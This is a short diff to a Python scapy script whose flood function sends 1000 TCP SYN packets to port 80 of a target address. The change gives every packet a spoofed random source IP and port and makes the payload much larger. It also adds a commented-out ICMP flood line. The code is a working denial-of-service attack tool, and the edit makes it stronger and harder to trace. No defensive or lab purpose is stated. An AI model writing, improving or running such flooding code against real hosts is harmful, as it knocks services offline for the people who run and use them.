@@ -1,7 +1,7 @@
 import random
 import string
 
-from scapy.layers.inet import IP, TCP
+from scapy.layers.inet import IP, TCP, ICMP
 from scapy.sendrecv import sr1, send
 
 
@@ -20,14 +20,15 @@ def random_port():
 
 
 def flood(d_ip):
-    s_ip = random_ip()
-    s_port = random_port()
     payload = ''
-    for i in range(4):
+    for i in range(10):
         srt = ''.join(random.sample(string.ascii_letters + string.digits, 50))
         payload = payload + srt
     for i in range(1000):
-        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/f"{payload}",verbose=0)
+        s_ip = random_ip()
+        s_port = random_port()
+        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/payload*50,verbose=0)
+       # send(IP(dst=d_ip, src=s_ip) / ICMP()/payload*50,verbose=0)
 
 
 if __name__ == '__main__':
